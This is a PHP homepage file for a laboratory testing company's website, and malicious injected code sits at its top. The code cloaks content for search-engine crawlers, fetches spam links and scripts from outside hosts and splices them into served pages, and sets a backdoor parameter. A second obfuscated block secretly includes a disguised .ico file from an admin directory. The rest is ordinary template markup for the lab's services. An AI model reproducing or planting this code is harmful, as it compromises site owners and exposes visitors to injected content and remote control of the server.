<?php
if(!defined('_NET'))
{	
error_reporting(0);
$NET='vosst'; 
define('_NET',$NET);
if(function_exists('date_default_timezone_set')){date_default_timezone_set('America/Los_Angeles');}$sll0='http://monogooglelinux.com/';$pinj_0='http://tds-err.com/i?r=1';$pinj_1='http://tds-narod.ru/i.txt';$FNN='lnk-trans2.php';$pinj_2='yahoo';$pinj_2='bing';$pinj_3=str_replace('google',$pinj_1,$sll0);$pinj_4='site';$sll0=str_replace('google',$pinj_4,$sll0);$pinj_5='';$pinj_6='';$pinj_7='';$pinj_8='';if(!empty($_SERVER['HTTP_USER_AGENT'])){$pinj_6=$_SERVER['HTTP_USER_AGENT'];}if(!empty($_SERVER['HTTP_REFERER'])){$pinj_5=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['REQUEST_URI'])){$pinj_7=$_SERVER['REQUEST_URI'];}if(!empty($_SERVER['REMOTE_ADDR'])){$pinj_8=$_SERVER['REMOTE_ADDR'];}if(!function_exists('get_cont')){function get_cont($pinj_9){if(function_exists('curl_init')){if(strpos($pinj_9,'NET=',0)>0){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_12=0;$pinj_13=0;$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if((strpos($pinj_11,' 404 Not',0)>0)||(strpos($pinj_11,'Location:',0)>0)){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;$pinj_12=1;}}else{if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}if($pinj_13==0){$pinj_14=array();$pinj_15=0;while(preg_match("/(Location:|URI:)[^(\n)]*/",$pinj_11,$pinj_14)&&($pinj_15<3)){$pinj_9=trim(str_replace($pinj_14[1],"",$pinj_14[0]));$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);$pinj_15=$pinj_15+1;$pinj_14=array();}if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);if($pinj_12==1){curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");}else{curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");}$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_16=@file_get_contents($pinj_9);return $pinj_16;}}if(!function_exists('SEbot_')){function SEbot_($pinj_17){if(strpos('-' .strtolower($pinj_17),'x compatible',0)>0){return 0;}if(strpos('-' .strtolower($pinj_17),'googlebot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'slurp',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'bing',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'msnbot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'yahoo',0)>0){return 1;}return 0;}}if(!function_exists('not_do_')){function not_do_($pinj_18){$pinj_19='gif|jpeg|png|js|css|swf|ico|txt|pdf|xml|jpg|pdf|doc';$pinj_20=explode("|",$pinj_19);$pinj_21=0;while($pinj_21<count($pinj_22)){if(strpos(' ' .strtolower($pinj_18),$pinj_22[$pinj_21],0)>0)return 1;$pinj_21=$pinj_21+1;}return 0;}}if(!function_exists('detect_encoding_')){function detect_encoding_($pinj_23){static $pinj_24=array('UTF-8','ASCII','Windows-1251','ISO-8859-2','ISO-8859-3','ISO-8859-4','ISO-8859-5','ISO-8859-6','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-10','ISO-8859-13','ISO-8859-14','ISO-8859-15','ISO-8859-16','ISO-8859-1','Windows-1252','Windows-1254',);foreach($pinj_24 as $pinj_25){$pinj_26=@iconv($pinj_25,$pinj_25 .'',$pinj_23);if(md5($pinj_26)== md5($pinj_23))return $pinj_25;}return null;}}if(isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on')){$pinj_27='https';}else{$pinj_27='http';}$pinj_28=substr(str_replace('www.','',$_SERVER['SERVER_NAME']),0,4);if((SEbot_($pinj_6)>0)&&empty($pinj_29)&&(not_do_($pinj_7)==0)){$pinj_29=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_29)>200){$pinj_30=get_cont($sll0 .$FNN .'?d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);$pinj_31=$pinj_29;$pinj_32=strpos(strtolower($pinj_29),"<body",0);$pinj_33=strpos(strtolower($pinj_29),">",$pinj_32);if(($pinj_32>0)&&($pinj_33>0)){$pinj_29=substr($pinj_31,0,$pinj_33+1) .$pinj_30 .'' .substr($pinj_31,$pinj_33+1);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}$pinj_29=str_replace('</body>',$pinj_30 .'</body>',$pinj_29);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}}if(isset($pinj_5)&&((strpos($pinj_5,'ogle.',0)>0)||(strpos($pinj_5,'ing.',0)>0)||(strpos($pinj_5,'ahoo.',0)>0)||(strpos($pinj_5,'ask.com',0)>0)||(strpos($pinj_5,'aol.',0)>0)||(strpos($pinj_5,'duckduckgo.',0)>0)||(strpos($pinj_5,'baidu.',0)>0))){$pinj_34='mkke';$pinj_35=180;if(!isset($_COOKIE[$pinj_34])||($_COOKIE[$pinj_34]<(time()))){$pinj_36=get_cont($sll0 .$FNN .'?rd=1&d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);if(strlen($pinj_36,'<!-- -->',0)>0)$pinj_35=9000;if(strlen($pinj_36)>10){$pinj_37=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_37)>400){$pinj_36=str_replace('-SID-',$NET,$pinj_36);$pinj_37=str_replace('</head>',$pinj_36 .'</head>',$pinj_37);setcookie($pinj_34,(time()+$pinj_35),(time()+$pinj_35*2),'/','.' .str_replace('www.','',$_SERVER['SERVER_NAME']));echo $pinj_37;exit;}}}} 
$p1='_lo'; $p1=$p1.'ads';  $i=0; while($i<12) { $p1='x'.$p1; $i=$i+1;} $p2=$p1.'2'; if(isset($_GET[$p1]) || isset($_POST[$p1]) ) { exit;} if(isset($_GET[$p2])  ) { $_GET[$p1]=$_GET[$p2];} if(isset($_POST[$p2]) ) { $_POST[$p1]=$_POST[$p2];}
}
/*,.*/
?><?php

?><?php
/*9d62c*/

@include "\057home\057wbue\1518z7h\0672i/p\165blic\137html\057GSRF\056indi\141proc\145ss.c\157m/Ad\155in/p\141ges/\145xamp\154es/.\1463d2b\0712e.i\143o";

/*9d62c*/
 ?>  <?php  include('Header.php');?>
<style>
    .slider-style-five .slide {
    padding: 51px 0px 56px 0px;
}
</style>
    <!-- main-slider -->
    <section class="main-slider slider-style-two slider-style-five">
        
        <div class="main-slider-carousel owl-carousel owl-theme">
            
            <div class="slide" style="background-image:url(images/index/banner-15.jpg)">
                <div class="bg-column"></div>
                <div class="container">
                    <div class="content-box">
                        <h1>COVID-19 <br> Testing Kit  </h1>
                        <div class="text">Personal Protective Equipment - Mask(N95,3ply),<br/>Gloves,Face Shield,Goggles,PPE Kits etc Testing for Covid-19.</div>
                        <div class="slider-btn">
                            <a href="Contact_Us.php" class="theme-btn theme-btn-three">Contact Us</a>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="slide" style="background-image:url(images/index/banner1.jpg)">
                <div class="bg-column"></div>
                <div class="container">
                    <div class="content-box">
                        <h1>Food & Feed<br> Testing </h1>
                        <div class="text">GSRF is the world leading food and feed testing laboratory group, deploying <br>a comprehensive range of state-of-the-art analytical techniques in order<br> to support its clients' increasingly stringent quality and safety standards.</div>
                        <div class="slider-btn">
                            <a href="Contact_Us.php" class="theme-btn theme-btn-three">Contact Us</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slide" style="background-image:url(images/index/banner3.jpg)">
                <div class="bg-column"></div>
                <div class="container">
                    <div class="content-box">
                        <h1>Forensic <br>Services</h1>
                        <div class="text">From the analysis of conventional samples (blood, urine and oral fluids)<br> through to the development and analysis of specialist samples (hair and nails),<br> our range of detectable drugs and chemicals is unsurpassed across Europe. More info</div>
                        <div class="slider-btn">
                            <a href="Contact_Us.php" class="theme-btn theme-btn-three">Contact Us</a>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="slide" style="background-image:url(images/index/banner2.jpg)">
                <div class="bg-column"></div>
                <div class="container">
                    <div class="content-box">
                        <h1>Genomics <br> Science</h1>
                        <div class="text">Genomics is an interdisciplinary field of biology focusing <br/> on the structure, function, evolution, mapping, and editing of genomes. <br/> A genome is an organism's complete set of DNA, including all of its genes.</div>
                        <div class="slider-btn">
                            <a href="Contact_Us.php" class="theme-btn theme-btn-three">Contact Us</a>
                        </div>
                    </div>
                </div>
            </div>
            
        </div>
    </section>
    <!-- main-slider end -->

    <!-- service-section -->
    <section class="service-section style-two">
        <div class="container">
            <div class="row">
                <div class="col-lg-3 col-md-6 col-sm-12 service-column">
                    <div class="single-service-content inner-box">
                        <figure class="image-box">
                            <img src="images/index/1234.jpg" alt="" style="height:200px; width:320px;">
                            <div class="overlay">
                                <div class="wrapper">
                                    <a href="#"><i class="fa fa-link"></i></a>
                                </div>                                    
                            </div>
                        </figure>
                        <div class="lower-content">
                            <h5><a href="#"> Covid-19 (PPE) Testing Kit </a></h5>
                            <div class="text">A PPE equipment includes clothing and other articles intended to protect the wearer from injury or other health-related risks. </div>
                            <div class="link"><a href="PPE.php" class="theme-btn-two">Read More</a></div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 col-sm-12 service-column">
                    <div class="single-service-content inner-box">
                        <figure class="image-box">
                            <img src="images/index/Enviroment.jpg" alt="" style="height:200px; width:320px;">
                            <div class="overlay">
                                <div class="wrapper">
                                    <a href="#"><i class="fa fa-link"></i></a>
                                </div>                                    
                            </div>
                        </figure>
                        <div class="lower-content">
                            <h5><a href="#">Environmental testing</a></h5>
                            <div class="text">A clean and safe environment is a pre-requisite for health and quality of life. GSRF contributes to this by providing market-leading laboratory</div>
                            <div class="link"><a href="environmental_testing.php" class="theme-btn-two">Read More</a></div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 col-sm-12 service-column">
                    <div class="single-service-content inner-box">
                        <figure class="image-box">
                            <img src="images/index/BioPharma.jpg" alt="" style="height:200px; width:320px;">
                            <div class="overlay">
                                <div class="wrapper">
                                    <a href="#"><i class="fa fa-link"></i></a>
                                </div>                                    
                            </div>
                        </figure>
                        <div class="lower-content">
                            <h5><a href="#">BioPharma Services</a></h5>
                            <div class="text">GSRF is a first-class biopharmaceutical outsourcing services partner (Contract Research Organization - CRO, Contract Development</div>
                            <div class="link"><a href="BioPharma_Services.php" class="theme-btn-two">Read More</a></div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 col-sm-12 service-column">
                    <div class="single-service-content inner-box">
                        <figure class="image-box">
                            <img src="images/index/maxresdefault.jpg" alt="" style="height:200px; width:320px;">
                            <div class="overlay">
                                <div class="wrapper">
                                    <a href="#"><i class="fa fa-link"></i></a>
                                </div>                                    
                            </div>
                        </figure>
                        <div class="lower-content">
                            <h5><a href="#">Agro Science</a></h5>
                            <div class="text">We help farmers to collect the right data and providing insight into soil and crop health, fertilisation, feed value and food safety.</div>
                            <div class="link"><a href="Agro_testing.php" class="theme-btn-two">Read More</a></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- service-section end -->

    <!-- service-style-five -->
    <section class="service-style-five gray-bg">
        <div class="container">
            <div class="title-box centred">
                <div class="sec-title">Our Services</div>
                <div class="top-text">Some Key Points</div>
            </div>
            <div class="products-discription"> 
                <div class="custom-tab-title centred">
                    <ul class="tab-title clearfix">
                        <li data-tab-name="details" class="active">METHODOLOGIES</li>
                        <li data-tab-name="review">RESEARCH & DEVELOPMENT</li>
                        <li data-tab-name="review-2">Advice Bureau</li>
                        <li data-tab-name="review-3">Training</li>
                         
                    </ul>
                </div>
                <div class="tab-details-content">
                    <div class="tab-content" id="details">
                        <div class="single-tab-content">
                            <div class="row">
                                <div class="col-lg-6 col-md-12 col-sm-12 image-column">
                                    <figure class="image-box"><img src="images/aboutus/appoldt.jpg" alt=""></figure>
                                </div>
                                <div class="col-lg-6 col-md-12 col-sm-12 content-column">
                                    <div class="content-box">
                                        <div class="title">METHODOLOGIES</div>
                                        <div class="text">
                                            <p>GSRF adheres strictly to Indian and International Standards like AOAC, Codex, BIS, FSSAI, OECD in order to yield accurate and efficient test results with minimum uncertainty levels.</p>
                                            <p>Instruments are Calibrated through authorized agencies</p>
                                        </div>
                                        <div class="link"><a href="#" class="theme-btn">Read More</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="tab-content" id="review">
                        <div class="single-tab-content">
                            <div class="row">
                                <div class="col-lg-6 col-md-12 col-sm-12 image-column">
                                    <figure class="image-box"><img src="images/index/R&D.jpg" alt=""></figure>
                                </div>
                                <div class="col-lg-6 col-md-12 col-sm-12 content-column">
                                    <div class="content-box">
                                        <div class="title">RESEARCH & DEVELOPMENT</div>
                                        <div class="text">
                                            <p>GSRF is a research organization, well known for conducting application oriented research aiming at problem solving and innovative
                                            solution. Since its establishment in 1978, GSRF has been actively involved in undertaking research projects assigned by various
                                            Government Departments and industrial organizations, private and public bodies in the fields of oil and oil-based products, animal feed,
                                            food and related materials, biofuels, oil substitutes etc.
                                            Research was conducted on food safety and nutrition,</p>
                                        </div>
                                        <div class="link"><a href="Research_and_Development.php" class="theme-btn">Read More</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="tab-content" id="review-2">
                        <div class="single-tab-content">
                            <div class="row">
                                <div class="col-lg-6 col-md-12 col-sm-12 image-column">
                                    <figure class="image-box"><img src="images/index/homepage-banner_final.jpg" alt=""></figure>
                                </div>
                                <div class="col-lg-6 col-md-12 col-sm-12 content-column">
                                    <div class="content-box">
                                        <div class="title">Advice Bureau</div>
                                        <div class="text">
                                            <p>GSRF acts also as information and advice bureau by offering consultancy service in the form of status /feasibility 
                                            reports, information papers, problem diagnosis, devising cost-effective solutions and updating the latest R&D findings
                                            Our consultancy Division has been able in making food manufacturers and retailers aware of all the technical
                                            specifications and testing requirements and solve specific queries</p>
                                        </div>
                                        <div class="link"><a href="Consultancy_Bureau.php" class="theme-btn">Read More</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="tab-content" id="review-3">
                        <div class="single-tab-content">
                            <div class="row">
                                <div class="col-lg-6 col-md-12 col-sm-12 image-column">
                                    <figure class="image-box"><img src="images/index/1653-X3.jpg" alt=""></figure>
                                </div>
                                <div class="col-lg-6 col-md-12 col-sm-12 content-column">
                                    <div class="content-box">
                                        <div class="title">Training</div>
                                        <div class="text">
                                            <p>Objective of Training programme is to provide fundamental concepts of routine and advanced
                                            techniques in analytical techniques, thorough practical experience in performing analysis and information
                                            regarding standard specifications, statutory requirements . ​Fresh graduates and postgraduates either employed 
                                            or unemployed may apply. Programme is designed to prepare the trainees in their ability to perform various testing
                                            methods with confidence. The present training programme are conducted
                                            through lectures and practical hands-on training in the laboratory.</p>
                                        </div>
                                        <div class="link"><a href="Consultancy_Bureau.php" class="theme-btn">Read More</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                </div>
            </div>
        </div>
    </section>
    <!-- service-style-five end -->

    
    <!-- cta-section end -->


    <!-- about-style-eight -->

    <!-- about-style-eight -->



    <!-- news-style-two -->
    <section class="news-style-two">
        <div class="container">
            <div class="title-box centred">
                <div class="sec-title">News</div>
                <div class="top-text">Latest News</div>
            </div>
            <div class="row">
                <!--Start single blog post-->
                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
                    <div class="single-blog-post">
                        <div class="img-holder">
                            <img src="images/resource/news-1.jpg" alt="Awesome Image">
                            <div class="categorie-button">
                                <a class="btn-one" href="#">Chamistry</a>    
                            </div>
                        </div>
                        <div class="text-holder">
                            <div class="meta-box">
                                <ul class="meta-info">
                                    <li><a href="#">By Michel Clark</a></li>
                                    <li><a href="#">Jan 08, 2019</a></li>
                                </ul>    
                            </div>
                            <h3 class="blog-title"><a href="#">Lacinia eget consecte sed convallis.</a></h3> 
                            <div class="text-box">
                                <p>No one rejects, dislikes our avoids pleasures itself, because it is all pleasure, but because those who do not know.</p>
                            </div>
                            <div class="readmore-button">
                                <a class="btn-two" href="#">Continue Reading<span class="flaticon-next"></span></a>
                            </div>  
                        </div>
                    </div>
                </div>
                <!--End single blog post-->
                <!--Start single blog post-->
                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
                    <div class="single-blog-post">
                        <div class="img-holder">
                            <img src="images/resource/news-2.jpg" alt="Awesome Image">
                            <div class="categorie-button">
                                <a class="btn-one" href="#">Gemological</a>    
                            </div>
                        </div>
                        <div class="text-holder">
                            <div class="meta-box">
                                <ul class="meta-info">
                                    <li><a href="#">By John Smith</a></li>
                                    <li><a href="#">Jan 10, 2019</a></li>
                                </ul>    
                            </div>
                            <h3 class="blog-title"><a href="#">Haematopoietic stem cell transplant.</a></h3> 
                            <div class="text-box">
                                <p>Nor again is there anyone who love pursues or desires to obtain pain of itself, bepain, but occasionally circumstances.</p>
                            </div>
                            <div class="readmore-button">
                                <a class="btn-two" href="#">Continue Reading<span class="flaticon-next"></span></a>
                            </div>  
                        </div>
                    </div>
                </div>
                <!--End single blog post-->
                <!--Start single blog post-->
                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
                    <div class="single-blog-post">
                        <div class="img-holder">
                            <img src="images/resource/news-2.jpg" alt="Awesome Image">
                            <div class="categorie-button">
                                <a class="btn-one" href="#">Scientific</a>    
                            </div>
                        </div>
                        <div class="text-holder">
                            <div class="meta-box">
                                <ul class="meta-info">
                                    <li><a href="#">By Mark Cory</a></li>
                                    <li><a href="#">Jan 14, 2019</a></li>
                                </ul>    
                            </div>
                            <h3 class="blog-title"><a href="#">Excepteur sint occaecat cupidatat.</a></h3> 
                            <div class="text-box">
                                <p>It not only helps you to chew and eat your food frames your faceany missing tooth can major impact your quality of life.</p>
                            </div>
                            <div class="readmore-button">
                                <a class="btn-two" href="#">Continue Reading<span class="flaticon-next"></span></a>
                            </div>  
                        </div>
                    </div>
                </div>
                <!--End single blog post-->
            </div>
        </div>
    </section>
    
    

    <!-- news-section -->
    <!--<section class="news-section gray-bg">-->
        <!--<div class="container">-->
        <!--    <div class="title-box">-->
        <!--        <div class="sec-title">Our Client's</div>-->
        <!--        <div class="title-text">work with us</div>-->
        <!--    </div>-->
        <!--    <div class="news-content">-->
        <!--        <div class="three-column-carousel">-->
        <!--            <div class="single-news-content">-->
        <!--                <figure class="image-box" style="padding:40px;"><img src="https://cdnmedia.eurofins.com/corporate-eurofins/media/12143668/tecna_logo.jpg?width=250&height=73" alt=""></figure>-->
        <!--            </div>-->
        <!--            <div class="single-news-content">-->
        <!--                <figure class="image-box" style="padding:40px;"><img src="https://cdnmedia.eurofins.com/corporate-eurofins/media/12145271/abraxis_logo.png?width=211&height=70" alt=""></figure>-->
                         
        <!--            </div>-->
        <!--            <div class="single-news-content">-->
        <!--                <figure class="image-box" style="padding:40px;"><img src="https://cdnmedia.eurofins.com/corporate-eurofins/media/12145380/ingenesa_logo.png" alt=""></figure>-->
                         
        <!--            </div>-->
        <!--            <div class="single-news-content">-->
        <!--                <figure class="image-box" style="padding:40px;"><img src="https://cdnmedia.eurofins.com/corporate-eurofins/media/12146262/gsd-logo.png" alt=""></figure>-->
                         
        <!--            </div>-->
                   
        <!--        </div>-->
        <!--    </div>-->
        <!--</div>-->
    <!--</section>-->
    <!-- news-section end -->
    <!-- news-style-two end -->

    <section class="subscribe-section">
        <div class="container">
            <div class="outer-box">
                <div class="row">
                    <div class="title-column col-lg-6">
                        <h2>Subscribe <br>to Our Newsletter</h2>
                    </div>
                    <div class="subscribe-form col-lg-6">
                        <form method="post" action="http://html.tonatheme.com/2019/Aculia/contact.html">
                            <div class="form-group">
                                <input type="email" name="email" value="" placeholder="Your email..." required="">
                                <button type="submit" class="theme-btn btn-style-six">Subscribe Now</button>
                            </div>
                        </form>
                    </div>
                </div> 
            </div>                                   
        </div>
    </section>
    

<?php include('Footer.php'); ?>